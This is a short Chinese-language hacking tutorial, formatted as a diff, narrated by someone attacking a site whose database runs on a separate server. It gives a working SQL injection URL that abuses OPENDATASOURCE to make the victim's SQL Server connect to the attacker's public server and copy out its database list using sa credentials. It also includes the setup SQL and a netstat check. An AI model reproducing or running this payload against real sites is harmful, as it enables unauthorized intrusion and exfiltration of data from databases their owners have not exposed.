@@ -1,0 +1,14 @@
+其实.即使数据库和WEB不在一块还是有机会搞的.并不是说一点机会没.一般服务器装好系统什么的.都会装个IIS吧？列他C盘.看看有没有Inetpub这个目录.就知道他有没有装IIS了.但是.不知道他IP也？怎么办呢？可以这样来，PING一下WEB服务器.扫他这一C段的1433端口.看看哪台开了.不过这方法也不好.现在很多主机都启用了防火墙.1433端口就算开了你也扫不着.这该怎么办呢？可以利用opendatasource宏让对方的SQL与自己的数据库建立连接.既然能建立连接.就可以得到数据库服务器的IP地址了.我们来试试看.有几个前提得说一下.第一.你机器必须要有公网IP.而且开放的1433端口要保证能被外网访问到.好.条件满足.就开始做吧！ 
+
+我现在搞的这站.100%数据和WEB不在一块.但是从C盘看到了Inetpub文件夹.说明这数据库服务器安装了IIS.但是得不到他IP呀.怎么搞哦.简单.就用上面所说的方法搞一下.先在本机建个库先.打开查询分析器输入
+create database Vincent create TABLE VV(name nvarchar(256) null);create TABLE DD(id int NULL,name nvarchar(256) null); 点执行. 
+
+建立了一个Vincent的库名.和VV DD两个表.VV里面有name这一个字段.DD也放了两字段名.一个是id一个是name.好了.现在就可以开始建立连接了~~~~~~~先看一下这条SQL语句insert into opendatasource('sqloledb','server=你的IP;uid=SQL用户;pwd=SQL密码;database=建立的库名') .库名.表名 '执行的语句' 恩现在开始吧... 
+
+http://www.xxx.com/news.asp?id=126'inser ... asource('sqloledb','server=XXX.XXX.XXX.XXX;uid=sa;pwd=Vincent;database=Vincent').Vincent.dbo.VV%20select%20name%20from%20master.dbo.sysdatabases-- 
+
+在IE上执行咯.呵呵这个时候对方就会连接到我机器的SQL服务器.不信？netstat -an看一下 
+XXX.XXX.XXX.XXX因为是从对方WEB服务器连过了。所以为本机IP
+在CMD下输入命令：
+netstat -an | find "1433"
+
